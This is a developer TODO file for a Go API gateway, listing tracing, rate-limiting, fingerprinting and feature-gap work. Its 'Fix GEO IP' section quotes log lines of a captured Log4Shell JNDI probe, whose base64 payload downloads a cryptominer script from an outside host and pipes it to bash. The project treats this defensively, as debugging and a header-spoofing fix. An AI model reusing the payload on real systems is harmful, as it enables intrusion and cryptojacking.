

# TODO tasks for the project

# Request identifier and tracing — RESOLVED

OpenTelemetry + Open Telemetry server: https://opentelemetry.io/

Should we add X-Request-ID to all requests and responses for tracing?
Are there any other ways to trace requests?
Are there libraries that already handle tracing?
Do libraries stick to an specific tracing product or standard?

**Answered/done:** went with real distributed tracing via OpenTelemetry
(the standard, not a homegrown `X-Request-ID`) — `middleware/tracing.go`,
`gateway/tracing.go` (`InitTracing`, the OTLP/HTTP exporter setup), the
top-level `tracing.enabled`/`tracing.endpoint`/`tracing.insecure` config
(not under `management`), and the `tracing` middleware name. Uses
`go.opentelemetry.io/contrib`'s `otelhttp` for both the server-side span
(per request) and the reverse-proxy transport (per backend call) instead
of hand-rolled instrumentation — genuinely distributed, not just one
isolated span per hop: an incoming W3C `traceparent` continues the
caller's trace, and it's propagated forward to whatever backend a proxy
route sends the request to. See `doc/middleware/tracing.md` for the full
reference, including exactly how this is tested (an in-memory exporter for
unit tests, no real collector needed; a plain `httptest.Server` standing
in for one to verify the actual OTLP export and cross-hop propagation) —
confirmed for real too, against a live `tg` binary and a throwaway fake
collector process, not just the test suite.

## Logs

Show logs in the dashboard
* Filter logs by date range
* Filter logs by severity level
* Search logs by keyword

## Stats

* CPU usage
* Memory usage

# Health check 

GET /_/health - Returns 200 OK if the service is running

Health check configuration for the routes configured in the gateway:
- Add a URL to check
- Check interval
- Timeout
- Expected response code
- Show the results in /_/health



## Password

* Add password strength validation with rules
    * Minimum length
    * Special characters
    * Uppercase letters
* Implement password reset functionality
* Maximum password attempts before lockout
    * Unlock account button
* Implement password expiration policy
* 2FA (Two-Factor Authentication)
    * Email-based 2FA?
    * SMS-based 2FA?
    * Authenticator app-based 2FA


# Constants data

## Countries

* Add a list of countries with their ISO codes
* Flag images for each country
* Country names in multiple languages
* Country calling codes
* Country time zones
* Country languages
* Country currencies

/countries -> [{...}, {...}, ...]
/countries/{countryCode} -> {
  "name": "Spain",
  "flag": "/_/countries/ES/flag",
  "isoCode": "ES",
  "iso3Code": "ESP",
  "callingCode": "+34",
  "timeZone": "Europe/Madrid",
  "languages": ["Spanish", "Catalan", "Galician", "Basque", "Valencian"],
  "currency": "EUR"
}
/countries/{countryCode}/flag -> image of the flag

## Languages

* Add a list of languages with their ISO codes
* Language names in multiple languages
* Language codes (ISO 639-1, ISO 639-2, ISO 639-3)

/languages -> [{...}, {...}, ...]
/languages/{languageCode} -> {
    "name": "Spanish",
    "isoCode": "es",
    "iso2Code": "es",
    "iso3Code": "spa",
    "nativeName": "Español",
    "rtl": false,
    "flag": "/_/languages/es/flag"
}
/languages/{languageCode}/flag -> image of the flag

## Timezones

* Add a list of time zones with their names and offsets
* Time zone names in multiple languages
* Time zone offsets in seconds
* Time zoned data: https://github.com/dmfilipenko/timezones.json/blob/master/timezones.json


## Storage

* Add a storage system for user-uploaded files
* Implement file versioning
* Allow users to manage their files (upload, delete, rename)
* Integrate with cloud storage providers (e.g., AWS S3, Google Cloud Storage)


# Fix GEO IP — RESOLVED

These logs show on megabox-qa:

```
2026/03/23 17:43:08 logging.go:27: 2026-03-23T17:43:08.271Z - 87.120.191.93:56554 "GET /t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z}')" 307 0.16ms
2026/03/23 17:43:08 clientinfo.go:73: Error getting geo data for IP t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z}'): FreeIPAPI returned status code 403
2026/03/23 17:43:08 logging.go:27: 2026-03-23T17:43:08.594Z - 87.120.191.93:56554 "GET /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D/31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z%7D%27%29" 404 0.10ms
2026/03/23 17:43:08 clientinfo.go:73: Error getting geo data for IP t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vMzEuNTcuMTA5LjEzMS9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtczsgd2dldCAtcU8tIGh0dHA6Ly8zMS41Ny4xMDkuMTMxL3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1z}'): FreeIPAPI returned status code 403
```

Why IP is not being parsed correctly? Is it because of the attack vector in the URL?

**Root cause, found while doing an unrelated recap of the project (2026-09-04):
not the URL at all.** `session.GetClientIP` trusted the
`X-Forwarded-For`/`X-Real-IP`/`X-Client-IP` headers unconditionally, from
*any* client, with no concept of "is this request even coming through a
proxy I control." The JNDI probe's request presumably also carried a
crafted `X-Forwarded-For` value (not shown in the truncated log excerpt
above) that GetClientIP took at face value and handed straight to the
geo-lookup API and the log line — this was never about parsing the URL,
it was about trusting a header that any direct client can set to
literally anything.

**Fixed**: those headers are now only honored when the request's real TCP
peer is loopback or an RFC 1918/RFC 4193 private-range address
(`session.isTrustedProxy`, via stdlib `net.IP.IsLoopback()`/`IsPrivate()`
— the same default Rails' `ActionDispatch::RemoteIp` uses). No
configuration needed or added: a direct external client can never present
a private-range address as its own real peer address in the first place
(not routable from the public internet), so this closes the spoofing hole
(which also affected IP-based rate limiting and analytics, not just this
log line) for the common case — a reverse proxy on the same host or in
the same private network/Docker/Kubernetes cluster — without asking an
operator to list anything. See `session.GetClientIP`'s doc comment
(`session/clientinfo.go`).

# Rate limiter

- Store persistent info about attackers (IP, user agent, etc.)
    - Show blocked IPs (with start and end date of the block)
    - Info about blocked IPs (number of requests, user agent, etc.), geo info, etc.
    - Show a map of attackers by country
- Request Details
    - Show IP address
    - Filter by IP address
    - Filter Period: add "last week", "last month", "last year"
    - Show user agent
    - Show if URL matches any of the blocking rules
    - Show the METHOD + PATH
- Does JA4 fingerprinting make any sense at all?
    - Answered, at least for JA4H specifically: not as a stable per-user
      identifier — it varies per request type for the same real client
      (see doc/middleware/ja4-fingerprint.md's "What it does"). Two
      follow-ups shipped to address this directly:
        - TLS-level JA4 (`server.tls.enabled` required) — much more
          stable, since it's a property of the client's TLS stack, not of
          any individual HTTP request. See `gateway/ja4tls.go`.
        - `StableFingerprint` — a reduced-entropy, non-TLS fallback built
          only from headers that don't vary by request type. See
          `middleware/fingerprint/stable.go`.
      All three then got consolidated into a single `Fingerprint` +
      `FingerprintType` field pair (`db.ClientInfo`, `X-User-Data`, the
      stats API) rather than three parallel columns, picked by priority
      (TLS JA4 > stable > JA4H) via `fingerprint.SelectFingerprint` — see
      `middleware/fingerprint/select.go` and
      doc/middleware/ja4-fingerprint.md's "One consolidated fingerprint,
      not three".
    - Can we use it to identify users? — still no for JA4H alone; TLS JA4
      and the stable fingerprint are meaningfully better for "same real
      client," but none of the three should be trusted as a hard 1:1
      identifier (all are still spoofable by a deliberately evasive
      client, to varying degrees — TLS JA4 hardest, JA4H easiest).
    - Can we identify bots? Can we identify returning users/attackers? —
      still open; a composite signal (IP + parsed User-Agent + Fingerprint/
      FingerprintType, tolerating partial drift) is the likely next step
      rather than trusting Fingerprint alone.
    - Filter by JA4 fingerprint separate parts? — still open, and now
      applies to three fields instead of one.

# Gateway feature gaps (vs. Kong/Traefik/nginx/Envoy/Tyk/KrakenD/APISIX/AWS API Gateway)

Deep-dive comparison done 2026-08-28, checked against the actual code (not
just recollection). Grouped by how load-bearing each feature is elsewhere;
we're working through these one at a time — see status notes.

## Tier 1 — near-universal, currently absent

- [x] **Response compression (brotli/zstd/gzip/deflate)** — done: `middleware/compression.go`,
      `management.compression` flag / `compression` middleware name. See
      `doc/middleware/compression.md`.
- [x] **TLS termination** — done: static cert/key files (`server.tls.*`),
      automatic HTTP→HTTPS redirect (`redirectPort`, default 80),
      zero-downtime certificate hot-reload on renewal (watches the cert/key
      files independently of config reload), **and** automatic ACME /
      Let's Encrypt issuance+renewal (`server.tls.acme`, mutually exclusive
      with `certFile`/`keyFile` — no wildcard domains, since that needs a
      `dns-01` challenge this integration doesn't implement). See
      `gateway/tls.go`, `config/tls.go`, and the README's "TLS / HTTPS"
      section (including the certificate file format reference).
- [ ] **Upstream health checks (active + passive)** for the load balancer
      (`gateway/loadbalancer.go`). Today it only reacts to a failed connection
      *during* a request — no background probing, no ejection of a backend
      that's merely slow/5xx-ing. Natural precursor to the circuit breaker
      already on the README roadmap.
- [ ] **Circuit breaker** (already flagged 🚧 in README) — smaller lift than
      full health checks: "stop trying this backend for N seconds after M
      failures," reusing the round-robin transport's per-target failure count.
- [ ] **Per-route timeouts.** No `Timeout` field in `config.RouteConfig`, and
      no deadline set on the proxy's transport — a hung backend can hold a
      request open indefinitely.
- [ ] **Horizontal scalability of state.** Rate limiter is a plain in-memory
      map; sessions live in SQLite with no Redis/shared-cache option anywhere
      (`grep -r redis` turns up nothing). Running >1 taronja replica today
      gives each instance its own rate-limit counters. Biggest architectural
      gap of the list — needs a deliberate pluggable-store decision, not a
      quick add.

## Tier 2 — very common, moderate lift, in-scope

- [ ] **JWT validation middleware** (already flagged 🚧 in README) — validate
      a bearer token against an external IdP, distinct from taronja's own
      session/API-token system.
- [ ] **API keys as a first-class "consumer" concept with quotas/plans** —
      rate limiting keyed off authenticated identity, not just source IP.
- [ ] **IP allow/deny lists and geo-blocking.** We already compute
      geolocation for analytics (`session/ipgeo.go`) but nothing *acts* on it.
- [ ] **Security response headers middleware** (HSTS, X-Frame-Options,
      X-Content-Type-Options, CSP) — same shape as `cors.go`.
- [ ] **Request body size limits** — no `MaxBytesReader`/content-length cap
      anywhere, including on the load balancer's body-buffering retry path.
- [x] **OpenTelemetry tracing** — done: see the resolved "Request identifier
      and tracing" section near the top of this file and
      `doc/middleware/tracing.md`.
- [ ] **Structured/JSON logging + Prometheus metrics export.** Our
      metrics/logging are custom and in-memory only today.
- [ ] **Header/URL transformation rules** — add/strip arbitrary
      request/response headers per route, regex path rewriting beyond
      `removeFromPath`.
- [ ] **WebSocket support: confirm and document, add test coverage.** Likely
      already works for single-target routes (the round-robin transport's
      fast path delegates straight to `http.DefaultTransport`, and
      `compressingResponseWriter` explicitly bypasses `Connection: Upgrade`
      requests untouched — see `middleware/compression.go`), but untested for
      the multi-target case and not documented anywhere.
- [ ] **Dynamic upstream discovery** (DNS SRV, Consul, Kubernetes
      Endpoints/EndpointSlice) instead of a static `to:` list.

## Tier 3 — common in bigger platforms, real scope questions for this project

GraphQL federation, gRPC/gRPC-Web transcoding, WAF-style request inspection
(SQLi/XSS filtering), weighted traffic splitting / canary / blue-green
deployments (natural extension of the load balancer — a `weight:` per
target), a scripting/plugin execution model (Lua/WASM — we already have a
compiled-Go extension point, see `doc/middleware_development.md`), generic
SAML/OIDC beyond the two hardcoded providers, a self-service developer
portal. Not pursuing unless users specifically ask.
